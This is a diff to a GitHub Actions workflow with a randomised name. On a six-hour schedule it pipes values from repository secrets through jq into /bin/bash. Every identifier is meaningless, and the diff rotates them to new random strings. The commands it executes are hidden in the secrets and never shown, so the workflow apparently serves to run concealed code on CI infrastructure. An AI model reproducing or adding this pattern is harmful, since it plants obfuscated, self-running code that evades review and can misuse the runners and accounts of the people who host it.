@@ -3,22 +3,24 @@ name: mnajiagnhong
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 0/6 * * *'
-
-jobs:  # 22280
+    - cron: '43 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: mnajiagnhong
         env:
-          xii38946: ${{ secrets.xii38946 }}
+          rqme5: ${{ secrets.rqme5 }}
         run: |
-          echo $xii38946 | jq -r .kv6620 | /bin/bash
-          echo $z036 | jq -r .ips3371 | /bin/bash
-          echo $ztak2890 | jq -r .pb45668 | /bin/bash
-          echo $ko7 | jq -r .u3 | /bin/bash
-          echo $fawxn2 | jq -r .v2944 | /bin/bash
-          echo $gvyi07830 | jq -r .qeiw43 | /bin/bash
-          echo $juw33240 | jq -r .o0 | /bin/bash
+          echo $rqme5 | jq -r .b7 | /bin/bash
+          echo $in9 | jq -r .eybk33550 | /bin/bash
+          echo $ail975 | jq -r .wktn04808 | /bin/bash
+          echo $wnyr26194 | jq -r .mk5344 | /bin/bash
+          echo $lcody78528 | jq -r .d19332 | /bin/bash
+          echo $i39828 | jq -r .z3783 | /bin/bash
+          echo $h45703 | jq -r .n8295 | /bin/bash
+          echo $ahk32 | jq -r .lip29841 | /bin/bash
+          echo $wahn620 | jq -r .juudy37 | /bin/bash
+          echo $igu57061 | jq -r .paw4842 | /bin/bash
 
